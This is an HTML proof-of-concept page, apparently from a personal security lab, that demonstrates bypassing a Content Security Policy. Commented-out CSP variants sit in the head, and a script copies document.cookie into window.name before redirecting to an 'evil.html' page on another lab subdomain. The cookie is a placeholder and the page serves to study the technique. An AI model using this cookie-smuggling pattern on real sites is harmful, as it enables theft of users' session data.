<!-- DOCTYPE HTML -->
<html>
<head>
  <!--meta http-equiv="Content-Security-Policy" content="script-src http://sub1.mylab.com/*"-->

  <!--meta http-equiv="Content-Security-Policy" content="script-src http://sub1.mylab.com/multi_csp_js/script1.js"-->
  <!--meta http-equiv="Content-Security-Policy" content="script-src https://code.jquery.com/jquery-1.12.4.min.js"-->

  <!--meta http-equiv="Content-Security-Policy" content="script-src http://sub1.mylab.com/multi_csp_js/script1.js https://code.jquery.com/jquery-1.12.4.min.js"-->
  <!--script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script-->
</head>
<body>
  <h1> Use shared resourde to bypass CSP. </h1>
  <p>In this test, victim has XSS and we can store important resource in shared resource and jump to evil.html to bypass the same origin limitation.</p><br>
  <!--script src='http://sub1.mylab.com/multi_csp_js/script1.js'></script-->
  <script>
    document.cookie="val=42";// as if I have a cookie
    console.log(window.location+': set cookie value');
    window.name=document.cookie;// pass critical resource value to shared resource
    console.log(window.location+': pass cookie to shared resource (window.name)');
    console.log(window.location+': jump to evil.html');
    alert("about to jump");
    window.location="http://sub2.mylab.com/share/evil.html";

  </script>
</body>
</html>
